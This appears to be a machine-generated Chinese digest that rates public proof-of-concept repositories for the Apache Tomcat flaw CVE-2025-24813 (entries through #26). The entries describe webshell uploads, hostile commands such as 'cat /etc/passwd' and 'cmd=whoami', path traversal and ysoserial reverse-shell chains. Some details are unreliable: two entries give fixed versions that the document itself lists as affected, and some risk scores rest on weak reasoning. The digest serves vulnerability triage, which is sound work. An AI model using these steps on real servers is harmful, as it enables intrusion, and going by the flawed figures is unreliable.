CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

